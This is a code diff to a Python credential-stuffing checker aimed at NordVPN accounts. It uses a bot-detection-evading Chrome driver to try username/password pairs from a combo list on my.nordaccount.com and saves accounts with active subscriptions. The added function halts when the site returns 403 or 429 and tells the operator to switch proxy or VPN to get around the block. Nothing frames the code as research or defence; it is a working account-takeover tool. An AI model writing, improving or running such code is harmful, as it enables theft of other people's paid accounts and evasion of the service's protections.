@@ -1,4 +1,5 @@
 import time
+import requests
 import undetected_chromedriver as stealthdriver
 from pathlib import Path
 from selenium.common.exceptions import NoSuchElementException
@@ -32,7 +33,17 @@ class Checker:
         combos.close()
         return len(self.users)
 
+    def check_denied_request(self):
+        denied = [403, 429]
+        req = requests.get(self.page)
+        if [request for request in denied if (req.status_code == request)]:
+            print("\nToo many requests - Access Denied")
+            print("Change proxy/vpn and try again.")
+            print("Ending.")
+            exit()
+
     def start(self, counter):
+        self.check_denied_request()
         try:
             self.browser = stealthdriver.Chrome(browser_executable_path="/usr/bin/google-chrome-stable",
                                                 driver_executable_path=self.driver_path)
@@ -56,13 +67,12 @@ class Checker:
             print(" - No such Element - Retrying")
             return 1
 
-
         if "https://my.nordaccount.com/dashboard/" in self.browser.current_url:
             self.browser.get(self.account_page)
             time.sleep(4)
             if self.browser.find_elements(By.XPATH, '//div[@class="text-small inline-block text-grey-darkest"]'):
                 account_status_text = (self.browser.find_element
-                                       (By.XPATH,'//div[@class="text-small inline-block text-grey-darkest"]').text)
+                                       (By.XPATH, '//div[@class="text-small inline-block text-grey-darkest"]').text)
                 if "Expires" in account_status_text:
                     print(" ---> Success!".format(self.users[counter], self.passwords[counter]))
                     self.save_account(self.users[counter], self.passwords[counter])
